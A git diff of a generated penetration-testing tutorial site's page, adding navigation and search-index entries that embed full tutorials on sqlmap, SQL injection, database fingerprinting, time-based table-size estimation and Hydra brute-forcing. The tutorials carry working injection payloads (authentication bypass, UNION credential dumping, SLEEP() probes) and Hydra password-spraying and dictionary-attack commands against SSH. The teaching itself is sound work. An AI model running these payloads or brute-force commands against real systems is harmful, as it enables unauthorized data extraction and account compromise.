@@ -182,6 +182,26 @@
                         <li class="sidebar-dropdown  ">
                             <button class="btn">
                                 <i class="material-icons me-2">code</i>
+                                Hydra
+                            </button>
+                            <div class="sidebar-submenu ">
+                                <ul>
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/hydra/hydra/introduction_to_hydra/">How to Use Hydra to Hack Passwords – Penetration Testing Tutorial</a></li>
+                                        
+                                    
+                                </ul>
+                            </div>
+                        </li>
+                    
+                
+                    
+                    
+                        <li class="sidebar-dropdown  ">
+                            <button class="btn">
+                                <i class="material-icons me-2">code</i>
                                 John The Ripper
                             </button>
                             <div class="sidebar-submenu ">
@@ -329,7 +349,7 @@
                                     
                                         
                                         
-                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/owasp-zap/owasp-zap/introduction_to_sqlmap/">SQLMap</a></li>
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/owasp-zap/owasp-zap/introduction_to_zap/">OWASP ZAP</a></li>
                                         
                                     
                                 </ul>
@@ -350,6 +370,51 @@
                                         
                                         
                                             <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/social-engineering-toolkit/social-engineering-toolkit/getting_started/">Getting started with Social Engineering Toolkit</a></li>
+                                        
+                                    
+                                </ul>
+                            </div>
+                        </li>
+                    
+                
+                    
+                    
+                        <li class="sidebar-dropdown  ">
+                            <button class="btn">
+                                <i class="material-icons me-2">code</i>
+                                SQLMap
+                            </button>
+                            <div class="sidebar-submenu ">
+                                <ul>
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/sqlmap/sqlmap/introduction_to_sqlmap.md/">An Introduction to Using sqlmap for SQL Injection Testing</a></li>
+                                        
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/sqlmap/sqlmap/what_is_sql_injection/">Comprehensive Guide to SQL Injection</a></li>
+                                        
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/sqlmap/sqlmap/database_fingerprinting_for_sql_injection/">Database Fingerprinting for SQL Injection: Identifying the Underlying DBMS</a></li>
+                                        
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/sqlmap/sqlmap/estimating_mysql_database_size/">Estimating MySQL Table Size using SQL Injection</a></li>
+                                        
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/sqlmap/sqlmap/time_based_blind_attacks/">Time-Based Blind SQL Injection Attacks</a></li>
+                                        
+                                    
+                                        
+                                        
+                                            <li class=" "><a class="sidebar-nested-link" href="http://localhost:1313/tutorials/docs/sqlmap/sqlmap/time_based_blinds_using_heavy_queries/">Time-Based Blind SQL Injection Using Heavy Queries</a></li>
                                         
                                     
                                 </ul>
@@ -1571,6 +1636,69 @@ rmdir &lt;directory&gt;</code>
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
 
 
     
@@ -1634,6 +1762,15 @@ rmdir &lt;directory&gt;</code>
     index.add(
             {
                 id:  6 ,
+                href: "\/tutorials\/docs\/sqlmap\/sqlmap\/introduction_to_sqlmap.md\/",
+                title: "An Introduction to Using sqlmap for SQL Injection Testing",
+                description: "Learn more about SQLMap",
+                content: "Introduction linkUsing sqlmap can be challenging if you’re unfamiliar with it. This tutorial aims to present the essential functionalities of this popular SQL injection tool in a quick and straightforward manner. Before using sqlmap, ensure you have the latest release and a Python interpreter installed. Most Linux distributions come with Python by default. If you’re not using Linux or don’t have Python installed, download and install it.\nYou’ll also need a vulnerable website to test. For this tutorial, we are using a simulation environment hosted locally and available on port 8888.\nWhat is sqlmap? linksqlmap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws in web applications. SQL injection is a common attack vector that allows attackers to interfere with the queries an application makes to its database. By leveraging this vulnerability, an attacker can retrieve or manipulate sensitive data stored in the database, and in some cases, gain administrative access to the underlying system.\nKey Features of sqlmap link Automated Testing:\nsqlmap automates the detection and exploitation of SQL injection vulnerabilities, simplifying the process for penetration testers and security professionals. Wide Range of SQL Injection Techniques:\nSupports a variety of SQL injection techniques, including time-based blind, boolean-based blind, error-based, UNION query-based, and out-of-band. Database Fingerprinting:\nAutomatically determines the database management system (DBMS) and version. Database Extraction:\nCapable of extracting data from the database, such as database names, tables, columns, and records. Advanced Exploitation Features:\nOffers advanced functionalities like retrieving database users, password hashes, and executing commands on the operating system via out-of-band connections. Integration with Other Tools:\nCan be integrated with other tools and scripts to enhance testing capabilities. Support for Various DBMS:\nSupports numerous database management systems including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, SQLite, IBM DB2, and more. Customizable and Extensible:\nHighly customizable with numerous options and flags to tailor attacks. Users can also extend its functionality with custom scripts and plugins. Typical Use Cases link Penetration Testing:\nSecurity professionals use sqlmap to identify and exploit SQL injection vulnerabilities during penetration testing engagements. Vulnerability Assessment:\nIt is used as part of vulnerability assessments to evaluate the security posture of web applications and identify potential risks. Security Research:\nResearchers use sqlmap to study SQL injection techniques and develop new methods for detecting and preventing such vulnerabilities. Compliance Testing:\nOrganizations use sqlmap to ensure their web applications comply with security standards and regulations by identifying and mitigating SQL injection vulnerabilities. Installing SQLMap linkYou can run the following command\ngit clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev cd sqlmap-dev python3 sqlmap.py You should see something like this:\nTo see the help options, run the following command:\npython sqlmap.py --help If you don’t see the sqlmap help output, double-check the setup instructions.\nTesting GET Parameters linkNow you are ready to test a vulnerable GET parameter. Run sqlmap with the following syntax, specifying the URL with the -u (or --url) parameter, including GET parameters and a random value for each one:\npython sqlmap.py -u \"http(s)://target[:port]/[...]/[page]?param=val[\u0026...]\" Example linkTesting a GET parameter with sqlmap:\npython sqlmap.py -u \"http://127.0.0.1:8888/cases/productsCategory.php?category=1\" Testing POST Parameters linkBy default, sqlmap tests only GET parameters. You can specify POST parameters using the --data option, and sqlmap will test both GET and POST parameters indicated:\npython sqlmap.py --data \"param=val[\u0026...]\" -u \"http(s)://target[:port]/[...]/[page]\" Example linkTesting POST parameters with sqlmap:\npython sqlmap.py --data \"username=xyz\u0026password=xyz\u0026submit=xyz\" -u \"http://127.0.0.1:8888/cases/login.php\" Note: Always specify the submit parameter name and its default value to avoid incorrect scan results.\nParsing Forms linkSqlmap can automatically parse and test all forms on a webpage, which is useful in many situations:\npython sqlmap.py --forms -u \"http(s)://target[:port]/[...]/[page]\" Example linkParsing forms with sqlmap:\npython sqlmap.py --forms -u \"http://127.0.0.1:8888/cases/productsCategory.php\" Adjusting the Level of Tests linkSqlmap defaults to testing GET and POST parameters but can test additional entry points like HTTP headers by adjusting the --level option (levels 1 to 5, with 1 being the default):\npython sqlmap.py -u \"http(s)://target[:port]/[...]/[page]\" --level 5 Testing URL Paths linkFor parameters included inside URI paths, append an asterisk (*) after each segment to specify where to try SQL injection:\npython sqlmap.py -u \"http://host/page/param-value*/\" Extracting Information with sqlmap linkSqlmap simplifies extracting information from databases, even without direct result display on the vulnerable webpage.\nOptions for Extracting Information: link Recover session user: python sqlmap.py -u \"http://target\" --current-user Detect current database: python sqlmap.py -u \"http://target\" --current-db Check if session user is a database administrator: python sqlmap.py -u \"http://target\" --is-dba List database system users: python sqlmap.py -u \"http://target\" --users List databases: python sqlmap.py -u \"http://target\" --dbs Enumerating Tables linkWhen the session user has read access to system tables, sqlmap can enumerate tables:\npython sqlmap.py -u \"http://target\" --tables Additional options:\nRestrict results to a specified database: python sqlmap.py -u \"http://target\" -D database_name --tables Exclude system tables: python sqlmap.py -u \"http://target\" --exclude-sysdbs --tables Enumerating Columns linkSqlmap can also enumerate columns if the session user has read access to the relevant system tables:\npython sqlmap.py -u \"http://target\" --columns Additional options:\nRestrict results to a specified database and table: python sqlmap.py -u \"http://target\" -D database_name -T table_name --columns Dumping Tables linkAttackers can dump entire tables or databases using the following options:\npython sqlmap.py -u \"http://target\" --dump Additional options:\nRestrict extracted data: python sqlmap.py -u \"http://target\" -D database_name -T table_name --dump Exclude system tables: python sqlmap.py -u \"http://target\" --exclude-sysdbs --dump Conclusion linkSqlmap is a powerful and versatile tool for SQL injection testing. This tutorial has covered the essential functionalities to get you started with sqlmap, from installation to extracting database information. Always use sqlmap responsibly and ensure you have permission before conducting any tests.\n"
+            }
+        );
+    index.add(
+            {
+                id:  7 ,
                 href: "\/tutorials\/docs\/autopsy\/",
                 title: "Autopsy",
                 description: "Learn more about Autopsy",
@@ -1642,7 +1779,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  7 ,
+                id:  8 ,
                 href: "\/tutorials\/docs\/autopsy\/autopsy\/introduction_to_autopsy\/",
                 title: "Autopsy",
                 description: "Learn more about Autopsy",
@@ -1651,7 +1788,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  8 ,
+                id:  9 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/bash_scripting\/",
                 title: "Bash Scripting in Linux",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1660,7 +1797,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  9 ,
+                id:  10 ,
                 href: "\/tutorials\/docs\/beef\/",
                 title: "beEF",
                 description: "Learn more about beEF",
@@ -1669,7 +1806,16 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  10 ,
+                id:  11 ,
+                href: "\/tutorials\/docs\/sqlmap\/sqlmap\/what_is_sql_injection\/",
+                title: "Comprehensive Guide to SQL Injection",
+                description: "Learn more about SQLMap",
+                content: "What is SQL Injection (SQLi)? linkSQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries an application makes to its database. This can enable an attacker to view or manipulate data that they normally cannot access. In severe cases, SQL injection can be used to compromise the underlying server or back-end infrastructure, leading to significant data breaches, reputational damage, and regulatory fines.\nImpact of SQL Injection linkA successful SQL injection attack can lead to unauthorized access to sensitive data, such as:\nUser passwords Credit card details Personal user information SQL injection attacks have been used in many high-profile data breaches, causing substantial damage. In some cases, attackers can establish a persistent backdoor into an organization’s systems, leading to prolonged and undetected compromises.\nDetecting SQL Injection Vulnerabilities linkManual Detection Techniques linkYou can manually detect SQL injection vulnerabilities by systematically testing every entry point in the application. Common techniques include:\nSingle Quote Test: Submit a single quote character (') and look for errors or anomalies. SQL-Specific Syntax Tests: Use syntax that evaluates to the same value (e.g., 1=1) and look for differences in responses. Boolean Conditions: Inject conditions like OR 1=1 and OR 1=2 and observe response differences. Time-Based Payloads: Inject payloads designed to trigger time delays and observe response times. Out-of-Band Network Interaction: Use OAST (Out-of-band Application Security Testing) payloads to trigger network interactions. Automated Detection linkTools like Burp Scanner can quickly and reliably detect SQL injection vulnerabilities, reducing the need for manual testing.\nExploiting SQL Injection Vulnerabilities linkCommon SQL Injection Techniques linkSQL injection vulnerabilities can occur in different parts of a SQL query. Here are some common types:\nRetrieving Hidden Data: Modify a SQL query to return additional results. Subverting Application Logic: Change a query to interfere with the application’s logic. UNION Attacks: Retrieve data from different database tables using the UNION keyword. Blind SQL Injection: Exploit vulnerabilities where the query results are not returned in the application’s responses. Examples linkRetrieving Hidden Data linkImagine a shopping application that displays products in different categories. A request to display products in the “Gifts” category might look like this:\nSELECT * FROM products WHERE category = 'Gifts' AND released = 1 An attacker can modify the URL to:\nhttps://insecure-website.com/products?category=Gifts'-- This results in the query:\nSELECT * FROM products WHERE category = 'Gifts'--' AND released = 1 The -- is a comment indicator in SQL, which means the rest of the query is ignored, showing all products including unreleased ones.\nSubverting Application Logic linkIn a login system:\nSELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese' An attacker can bypass authentication by entering:\nUsername: administrator'-- Password: (blank) Resulting in:\nSELECT * FROM users WHERE username = 'administrator'--' AND password = '' UNION Attacks linkRetrieve data from another table:\nSELECT name, description FROM products WHERE category = 'Gifts' Modify input to:\n' UNION SELECT username, password FROM users-- Resulting in:\nSELECT name, description FROM products WHERE category = 'Gifts' UNION SELECT username, password FROM users-- Advanced SQL Injection Techniques linkBlind SQL Injection linkBlind SQL injection occurs when the application does not return query results or error details in its responses. Techniques include:\nBoolean-Based Blind SQL Injection: Change the logic of the query to trigger different responses based on a condition. Time-Based Blind SQL Injection: Inject conditions that trigger time delays to infer true/false conditions. Out-of-Band SQL Injection: Trigger external network interactions to exfiltrate data. Second-Order SQL Injection linkOccurs when user input is stored and later used unsafely in a SQL query. For example, an application safely stores user input but later retrieves and uses it without proper validation.\nPreventing SQL Injection linkParameterized Queries (Prepared Statements) linkUse parameterized queries to prevent SQL injection. This technique separates SQL code from data, ensuring user input cannot interfere with query structure.\nVulnerable Code:\nString query = \"SELECT * FROM products WHERE category = '\" + input + \"'\"; Statement statement = connection.createStatement(); ResultSet resultSet = statement.executeQuery(query); Secure Code:\nPreparedStatement statement = connection.prepareStatement(\"SELECT * FROM products WHERE category = ?\"); statement.setString(1, input); ResultSet resultSet = statement.executeQuery(); Whitelisting and Input Validation linkFor parts of the query that cannot use parameterized queries (e.g., table or column names), use whitelisting to validate input against a list of permitted values.\nAdditional Best Practices link Escape User Input: Properly escape special characters in user inputs. Use ORM Libraries: Object-Relational Mapping (ORM) libraries can help mitigate SQL injection by abstracting SQL queries. Least Privilege: Ensure database accounts have the minimum privileges necessary. Conclusion linkSQL injection remains one of the most critical security vulnerabilities in web applications. Understanding how to detect, exploit, and prevent SQL injection is crucial for developers, testers, and security professionals. By following best practices such as using parameterized queries and whitelisting, you can significantly reduce the risk of SQL injection attacks.\n"
+            }
+        );
+    index.add(
+            {
+                id:  12 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/conducting_a_discovery_scan\/",
                 title: "Conducting a Discovery Scan in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1678,7 +1824,16 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  11 ,
+                id:  13 ,
+                href: "\/tutorials\/docs\/sqlmap\/sqlmap\/database_fingerprinting_for_sql_injection\/",
+                title: "Database Fingerprinting for SQL Injection: Identifying the Underlying DBMS",
+                description: "Learn more about SQLMap",
+                content: "Database fingerprinting is a crucial step in SQL injection attacks. Identifying the underlying database management system (DBMS) allows attackers to fine-tune their injected segments and fully exploit vulnerabilities. This guide explores techniques for fingerprinting a database using SQL injection.\nError Messages linkOne of the simplest ways to fingerprint a database is through error messages. When a database error is generated, the error message often includes information about the DBMS.\nExample:\nORA-01789: query block has incorrect number of result columns. The error prefix “ORA” and the 5-digit error number indicate that Oracle is the underlying database. Each DBMS has a unique error message structure, making it easier to identify the DBMS.\nExtracting Database Version linkAnother method to identify the DBMS is to retrieve the database version using a UNION SELECT statement. Here’s how to obtain the database version for popular DBMS:\nOracle: SELECT banner FROM v$version WHERE rownum=1; SQL Server and MySQL: SELECT @@version; Example Injection:\n1 AND 1=2 UNION SELECT 1, 2, @@version Resulting Query:\nSELECT id, qty, name FROM products WHERE id=1 UNION SELECT 1, 2, @@version; Example Result:\nMicrosoft SQL Server 2008 (SP1) - 10.0.2531.0 (X64) Mar 29 2009 10:11:52 Copyright (c) 1988-2008 Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) This output not only identifies the DBMS but also provides detailed version information.\nInference Database Fingerprinting linkIf no direct information is returned to the end user, the attacker can still identify the DBMS using inference testing. The idea is to submit SQL segments valid only for one specific DBMS. If the segment executes successfully, the DBMS is identified.\nNumeric Input linkInject a numeric function that exists in only one DBMS. If the function is not recognized, an error will occur. Otherwise, the function will execute and return a value.\nNumeric Functions:\nMySQL: POW(1,1) Oracle: BITAND(1,1) SQL Server: SQUARE(1) Example Test for MySQL:\nhttp://www.victim.com/author.php?id=6-POW(1,1) If the same page is displayed as with the original URL, it suggests that MySQL is the backend database.\nText Input linkUse text functions or concatenation operators unique to each DBMS.\nConcatenation Operators:\nOracle: 'abc' || 'def' MySQL: 'abc' 'def' SQL Server: 'abc' + 'def' Example Test for MySQL:\nhttp://www.victim.com/author.php?nickname='Steeve' 'Jobs' If the same page is returned, MySQL is likely the DBMS.\nBlind SQL Injection linkFor blind SQL injection, inference testing can be used with functions unique to a single DBMS. A time-based test is often effective.\nExample Time-Based Test:\nSELECT id, qty, name FROM products WHERE id=1 AND IF(MID(VERSION(),1,1) = '5', SLEEP(15), 0); If the response is delayed, it indicates the database server is running MySQL version 5.x.\nAlternative Solutions linkWhen previous techniques fail, assumptions can be made based on the web application technology. For example:\nASP.NET applications are likely using SQL Server. PHP applications typically use MySQL. Network scanning tools like nmap can also fingerprint databases but are outside the scope of SQL injection techniques.\nConclusion linkIdentifying the underlying DBMS is critical for exploiting SQL injection vulnerabilities effectively. Techniques like error message analysis, version extraction, inference testing, and time-based attacks provide various ways to fingerprint a database. Using these methods, attackers can tailor their injection strategies to the specific database system, maximizing the impact of their attacks. Always ensure that such activities are conducted ethically and with proper authorization.\n"
+            }
+        );
+    index.add(
+            {
+                id:  14 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/database_support\/",
                 title: "Database Support in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1687,7 +1842,16 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  12 ,
+                id:  15 ,
+                href: "\/tutorials\/docs\/sqlmap\/sqlmap\/estimating_mysql_database_size\/",
+                title: "Estimating MySQL Table Size using SQL Injection",
+                description: "Learn more about SQLMap",
+                content: "Estimating the size of a MySQL table using SQL injection can provide valuable information to an attacker. Knowing the approximate number of records in a table helps estimate the time required to extract all the data, which is crucial when dealing with slow or limited extraction techniques.\nHow It Works linkWhen a SELECT query is executed, the database engine evaluates all records returned by the statement to ensure they satisfy the WHERE clause. By injecting a short time delay in the WHERE clause, it is possible to estimate the number of records in the table. This technique leverages MySQL’s SLEEP() function, which can be integrated into any SQL query.\nEstimating Table Size with SQL Injection linkConcept linkIf a table has 5000 rows and a SLEEP(0.01) function is injected, it will result in a 50-second delay before the server response is sent. If the table has 300 records, the delay will be 3 seconds. The attacker starts with a short delay and gradually increases it until a noticeable total delay is observed.\nExample Process linkAssume the attacker does not know the table names or the number of rows in each table. Here’s how the attacker proceeds:\nFirst Query (Short Delay):\nSELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.001); Result: Response is returned quickly (clearly under 1 second).\nThis indicates that either there are far fewer than 1000 records, or the field is not vulnerable to SQL injection.\nSecond Query (Longer Delay):\nSELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.1); Result: The response takes a few seconds.\nThis suggests there are between 20 and 50 records.\nThird Query (Fine Tuning the Delay):\nSELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.5); Result: This query takes just over 19 seconds to execute.\nThis indicates approximately 38 records in the table, which is accurate as the test environment’s products table has exactly 38 rows.\nImportant Considerations linkWHERE Clause Conditions linkEach injection example includes an always false condition to ensure the SLEEP() function is executed. If the database engine skips the time delay, the results will be inaccurate.\nFor example, if 50% of the products come from the same supplier:\nSELECT * FROM products WHERE supplier=1 OR SLEEP(0.5); Result: This query takes 9.5 seconds to execute.\nThe database engine may skip the SLEEP() function if the first part of the condition is true. The attacker might conclude there are 19 records when there are actually twice as many. Ensure the SLEEP() function is executed for each row by using always false conditions like:\nSELECT * FROM products WHERE id=1 AND 1=2 OR SLEEP(0.5); SELECT from Multiple Tables linkThis technique does not work when data comes from multiple tables. If the SELECT query joins multiple tables, the estimated size might not be accurate. Assumptions can be made from the results returned on the page, but this requires careful analysis.\nConclusion linkEstimating the size of a MySQL table using SQL injection provides attackers with an understanding of the number of records, helping to plan data extraction efficiently. This technique relies on injecting time delays in the WHERE clause and observing the server response times. Always ensure the time delay is executed for each row by using appropriate conditions in the WHERE clause.\n"
+            }
+        );
+    index.add(
+            {
+                id:  16 ,
                 href: "\/tutorials\/docs\/beef\/beef\/exploiting_browser_sessions\/",
                 title: "Exploiting Browser Sessions With BeEF",
                 description: "Learn more about beEF",
@@ -1696,7 +1860,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  13 ,
+                id:  17 ,
                 href: "\/tutorials\/docs\/social-engineering-toolkit\/social-engineering-toolkit\/getting_started\/",
                 title: "Getting started with Social Engineering Toolkit",
                 description: "In this section, you will learn about the Social Engineering Toolkit and provide a beginner’s guide to using it.",
@@ -1705,7 +1869,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  14 ,
+                id:  18 ,
                 href: "\/tutorials\/docs\/hashcat\/",
                 title: "Hashcat",
                 description: "Learn more about Hashcat",
@@ -1714,7 +1878,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  15 ,
+                id:  19 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/hashing_and_password_cracking\/",
                 title: "Hashing and Password cracking in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1723,7 +1887,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  16 ,
+                id:  20 ,
                 href: "\/tutorials\/docs\/beef\/beef\/hooking_we_browsers_wit_beef\/",
                 title: "Hooking Web Browsers with BeEF",
                 description: "Now that you know how to install and start BeEF, let’s explore how to exploit a browser by hooking into it.",
@@ -1732,7 +1896,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  17 ,
+                id:  21 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/shell_metasploit\/",
                 title: "How to Use a Reverse Shell in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1741,7 +1905,25 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  18 ,
+                id:  22 ,
+                href: "\/tutorials\/docs\/hydra\/hydra\/introduction_to_hydra\/",
+                title: "How to Use Hydra to Hack Passwords – Penetration Testing Tutorial",
+                description: "Learn more about Hydra",
+                content: "Introduction linkHydra is a powerful brute-forcing tool used by penetration testers and ethical hackers to crack passwords of network services. It can perform rapid dictionary attacks against more than 50 protocols, including Telnet, FTP, HTTP, HTTPS, SMB, databases, and several other services. Developed by the hacker group “The Hacker’s Choice,” Hydra was first released in 2000 as a proof-of-concept tool for attacking network logon services.\nUnlike sequential brute-forcing tools, Hydra is a parallelized login cracker, allowing multiple connections simultaneously, significantly reducing the time required to crack a password.\nThis section will guide you through using Hydra, covering installation, common attack types, and essential flags and options. Note: This tutorial is for educational purposes only. Always obtain permission before scanning, brute-forcing, or exploiting any system.\nHow to Install Hydra linkPre-installed Systems linkHydra comes pre-installed with Kali Linux and Parrot OS. If you are using one of these, you can start working with Hydra immediately.\nUbuntu linkUse the apt package manager to install Hydra:\n$ sudo apt install hydra macOS linkHydra is available under Homebrew:\n$ brew install hydra Windows linkIt’s recommended to use a virtual box and install Linux. Using Windows for professional penetration testing is not advisable.\nHow to Work with Hydra linkStarting with Hydra linkBegin by exploring the help command to understand Hydra’s options:\n$ hydra -h This command provides a list of flags and options available in Hydra.\nSingle Username/Password Attack linkTo perform a simple attack with known username and password:\n$ hydra -l -p Example:\nAssume you had a user named admin, and password named admin hosted at 10.10.137.50. (Make sure you have a service running at a hosted address and can connect via ssh).\n$ hydra -l admin -p admin 10.10.137.50 ssh Password Spraying Attack linkTo perform a password spray attack where you test a known password against multiple usernames (in a case where you don’t know exactly who the user is):\nCreate a file called users.txt with the following content: root admin user tech steve richard Run the password spray attack: We are going to test the password “admin”. hydra -L users.txt -p admin 10.10.137.50 ssh Dictionary Attack linkTo perform a dictionary attack using a list of passwords:\nUse the RockYou wordlist, typically found at /usr/share/wordlists/rockyou.txt on Kali Linux or on (github). Run the dictionary attack: $ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh Verbosity and Debugging linkHydra can be awfully quiet when running large brute-force attacks. If we have to make sure Hydra is doing what it is expected to do, there are two flags we can use.\nThe verbosity (-v) flag will show us the login attempt for each username/password combination. This can be a bit much when there are a lot of combinations to go through, but if it is something you need, we can use the verbosity flag.\nVerbosity Flag linkTo show each login attempt:\n$ hydra -v -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh Debug Flag linkTo gather more detailed information:\n$ hydra -d -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.137.50 ssh Saving Results linkTo save the results of your attack:\n$ hydra -l -p -o Additional Flags and Formats linkService Specification linkSpecify the service with the IP address:\n$ hydra -l -p ssh:// Resuming Attacks linkResume a session if Hydra exits during an attack:\n$ hydra -R Custom Ports linkSpecify custom ports if services run on non-default ports:\n$ hydra -l -p -s Attacking Multiple Hosts linkAttack multiple hosts using a file containing a list of IP addresses:\n$ hydra -l -p -M Targeted Combinations linkUse specific username/password combinations:\nCreate a file combinations.txt with the format: username1:password1 username2:password2 username3:password3 Run the command: $ hydra -C combinations.txt How to Defend Against Hydra linkStrong Passwords linkUse strong passwords to make brute-force attacks difficult.\nPassword Policies linkEnforce policies to change passwords regularly.\nLimiting Authorization Attempts linkLock accounts after a few failed login attempts to prevent brute-force attacks.\nUse Re-captcha linkImplement re-captcha to prevent automated brute-force attacks.\nSummary linkHydra is a fast, flexible network brute-forcing tool essential for penetration testing. With its modular architecture and support for parallelization, Hydra can be extended to include new protocols and services easily. Always use Hydra responsibly and ethically.\n"
+            }
+        );
+    index.add(
+            {
+                id:  23 ,
+                href: "\/tutorials\/docs\/hydra\/",
+                title: "Hydra",
+                description: "Learn more about Hydra",
+                content: ""
+            }
+        );
+    index.add(
+            {
+                id:  24 ,
                 href: "\/tutorials\/docs\/beef\/beef\/introduction_to_beef\/",
                 title: "Introduction to BeEF: The Browser Exploitation Framework",
                 description: "Learn more about beEF",
@@ -1750,7 +1932,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  19 ,
+                id:  25 ,
                 href: "\/tutorials\/docs\/hashcat\/hashcat\/introduction_to_hashcat\/",
                 title: "Introduction to Hashcat",
                 description: "Cracking Passwords with Hashcat: A Comprehensive Guide linkIntroduction linkHashing is one of the pillars of cybersecurity, crucial for securing passwords and sensitive data. However, it’s often confused with encryption. Unlike encryption, hashed data is not reversible. This distinction is vital for applications like password storage, where security is paramount.\nIn this section, we will delve into Hashcat, a powerful command-line utility designed for cracking hashes. We will explore how hashing works, the features of Hashcat, and provide step-by-step instructions for its installation and use.",
@@ -1759,7 +1941,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  20 ,
+                id:  26 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/running_modules_using_metasploit\/",
                 title: "Introduction to Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1768,7 +1950,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  21 ,
+                id:  27 ,
                 href: "\/tutorials\/docs\/john-the-ripper\/",
                 title: "John The Ripper",
                 description: "Learn more about John The Ripper",
@@ -1777,7 +1959,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  22 ,
+                id:  28 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/",
                 title: "Linux Basics for Hackers",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1786,7 +1968,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  23 ,
+                id:  29 ,
                 href: "\/tutorials\/docs\/metasploit\/metasploit\/managing_sessions\/",
                 title: "Managing Sessions in Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1795,7 +1977,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  24 ,
+                id:  30 ,
                 href: "\/tutorials\/docs\/metasploit\/",
                 title: "Metasploit",
                 description: "Learn more about the Metasploit framework.",
@@ -1804,7 +1986,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  25 ,
+                id:  31 ,
                 href: "\/tutorials\/docs\/linux-basics-for-hackers\/linux-basics-for-hackers\/networking_in_kali\/",
                 title: "Networking in Linux",
                 description: "Welcome to the basics of Linux for Hacking.",
@@ -1813,7 +1995,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  26 ,
+                id:  32 ,
                 href: "\/tutorials\/docs\/nmap\/",
                 title: "Nmap",
                 description: "Learn more about Nmap",
@@ -1822,7 +2004,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  27 ,
+                id:  33 ,
                 href: "\/tutorials\/docs\/nmap\/nmap\/cheat_sheet\/",
                 title: "Nmap Cheat-Sheet: Scanning Types, Commands, and NSE Scripts",
                 description: "Learn more about the Nmap",
@@ -1831,7 +2013,7 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  28 ,
+                id:  34 ,
                 href: "\/tutorials\/docs\/owasp-zap\/",
                 title: "OWASP ZAP",
                 description: "Learn more about SQLMap",
@@ -1840,7 +2022,16 @@ rmdir &lt;directory&gt;</code>
         );
     index.add(
             {
-                id:  29 ,
+                id:  35 ,
+                href: "\/tutorials\/docs\/owasp-zap\/owasp-zap\/introduction_to_zap\/",
+                title: "OWASP ZAP",
+                description: "Learn more about OWASP ZAP",
